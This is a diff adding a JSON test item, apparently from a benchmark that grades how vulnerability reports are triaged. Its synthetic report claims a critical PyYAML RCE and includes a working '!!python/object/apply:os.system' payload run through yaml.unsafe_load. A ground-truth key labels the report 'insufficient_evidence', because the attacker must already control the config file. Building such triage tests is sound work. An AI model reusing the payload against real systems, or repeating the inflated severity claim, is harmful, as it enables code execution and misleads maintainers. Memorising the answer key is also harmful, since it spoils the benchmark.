@@ -1,0 +1,18 @@
+{
+  "report": {
+    "report_id": "trustmodel-configfile",
+    "package": "pyyaml",
+    "affected_version": "6.0.1",
+    "title": "RCE via malicious config file in PyYAML",
+    "body": "Critical RCE in PyYAML 6.0.1 config handling. If an attacker replaces the application's config file (app_config.yaml) on disk, yaml.unsafe_load executes arbitrary code, giving remote code execution. I have confirmed this is fully exploitable.\n\nProof of concept:\n\n```python\nimport os, tempfile, yaml\nmarker = os.path.join(tempfile.gettempdir(), \"cfg_pwned\")\nif os.path.exists(marker): os.remove(marker)\n# The application loads its OWN config file. This PoC assumes the attacker has\n# already replaced that trusted config file on disk with a malicious one.\ncfgpath = os.path.join(tempfile.mkdtemp(), \"app_config.yaml\")\nopen(cfgpath,\"w\").write(\"!!python/object/apply:os.system ['touch %s']\" % marker)\ndata = yaml.unsafe_load(open(cfgpath).read())\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(marker) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "ai_assistant_user"
+  },
+  "ground_truth": {
+    "expected_verdict": "insufficient_evidence",
+    "package": "pyyaml",
+    "fixed_version": null,
+    "cve": null,
+    "source": "trust-model-confusion (synthetic, mirrors dnsmasq/Hibernate)",
+    "note": "reproduces but precondition = attacker must control the config file"
+  }
+}
